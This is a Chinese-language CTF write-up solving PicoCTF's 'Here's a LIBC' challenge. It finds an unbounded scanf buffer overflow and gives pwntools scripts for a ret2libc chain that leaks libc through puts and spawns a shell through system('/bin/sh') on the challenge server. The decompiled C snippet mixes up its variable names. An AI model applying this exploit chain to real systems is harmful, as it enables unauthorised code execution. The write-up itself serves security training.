---
title: 【CTF-WriteUp】PicoCTF-Here's a LIBC
date: 2023-10-20
tags:
  - ctf
---

題目：
	
	給你指定的libc與elf file請pwn掉它

# 概念：

* 組合語言課學的各種東西
* 逆向工程
* Little endian
* stack frame
* ELF format
* ret2libc

# 題解：

### 執行 file 查看檔案屬性

![checksec](/images/ctf/picoctf_heresalibc/file.png)

這是一個64位ELF格式可執行檔

### 執行 checksec 查看安全屬性

![checksec](/images/ctf/picoctf_heresalibc/checksec.png)

只開了 NX(No-Execute, 堆疊不可執行)

### 拿去Ghidra或IDA逆向

看起來會用到的函式：

```c
char convert_case(char c, int f){
  char ret;
  if( c < 'a' || c > 'z' ){
    if( c < 'A' || c > 'Z' )
	  ret = a;
	else if(f % 2 == 0)
	  ret = a;
	else
	  ret = a + 32;
  }
  else if( f % 2 == 0 )
    ret = a - 32;
  else
    ret = a;
  
  return ret;
}
void do_stuff(){
  char garbage;
  char str[112];
  scanf("%[^\n]", str);
  scanf("%c", &garbage);
  for(int i = 0; i < 100 ; i++){
    str[i] = convert_case(str[i], i);
  }
  puts(str);
}
void main(){
    ...
    // puts(歡迎訊息);
	do{
	  do_stuff();
	}while(true);
}
```

在函式do_stuff()裡，`scanf("%[^\n]", str)` 的意思是會一直讀到換行為止然後塞進 str，
沒有限制輸入長度因此出現Buffer Overflow漏洞

[Ref: PWN 入門 - buffer overflow 是什麼？](https://tech-blog.cymetrics.io/posts/crystal/pwn-intro/)

利用 Buffer Overflow 可以控制程式的執行流程，現在就出現一個問題：該跳到哪？

可以看到在函式最後有個puts()，可以利用這個函式來leak出libc的位址，透過pwntools來算

```py
elf = ELF("./vuln")
libc = ELF('./libc.so.6')
p = process('./vuln')

puts_got = elf.got['puts'] # ELF 格式中的Global Offset Table，存了很多指向變數或函式的指標
puts_plt = elf.plt['puts'] # ELF 格式中的 Procedure Linkage Table，存動態連結的函式

print(hex(puts_got))
print(hex(puts_plt))

mainadr = elf.sym['main'] # 找到puts後我們還要繼續讓程式正常執行，所以要讓程式跳到main

poprdi = 0x400913 
# 在64位元，傳遞第一個參數(rdi)給函式的方法是pop rdi; ret，可以使用ROPGadget工具直接找這段程式的位址
# ROPGadget --binary ./vuln | grep "pop rdi"

pad = 136 # 陣列的位址到return address直接看IDA可以發現差了 0x88 個 bytes

p.recvuntil(b'eR!\n') # 讀歡迎訊息
payload = b'A'*pad + p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(mainadr)

p.sendline(payload) # 送出
p.recvline() # 略過不需要的字串

puts_leak = u64(p.recv(6)+b'\x00\x00')
print(hex(puts_leak))

libc_base = puts_leak - libc.sym['puts'] # puts的位址減掉偏移就是libc的位址
print(hex(libc_base))
```

目標是要取得對方的shell來控制對方，所以要從libc裡找 system 這個函式以及可以用的shell(/bin/sh)

```py
sym = libc_base + libc.sym['system'] # 從libc找system的位址
binsh = libc_base + next(libc.search(b'/bin/sh\x00')) # 找/bin/sh這個字串然後算實際位址
```

在64位元環境下執行system記憶體要16 bytes對齊(rsp的尾數必須是0)，不是的話會Segmentation fault，
只要在前面加一個ret指令就對齊了


### exploit

```py
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF("./vuln")
libc = ELF('./libc.so.6')

p = remote('mercury.picoctf.net', PORT)

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
print(hex(puts_got))
print(hex(puts_plt))

mainadr = elf.sym['main']

poprdi = 0x400913

pad = 136

p.recvuntil(b'eR!\n')
payload = b'A'*pad + p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(mainadr)

p.sendline(payload)
p.recvline()

puts_leak = u64(p.recv(6)+b'\x00\x00')
print('Leaked puts() addr: ', hex(puts_leak))

libc_base = puts_leak - libc.sym['puts']
print('Leaked LibC addr: ', hex(libc_base))

sym = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

ret = 0x40052e # 一樣可用ROPGadget直接找

payload = b'A'*pad  + p64(ret) + p64(poprdi) + p64(binsh) + p64(sym)

p.clean()
p.sendline(payload)

p.interactive()
```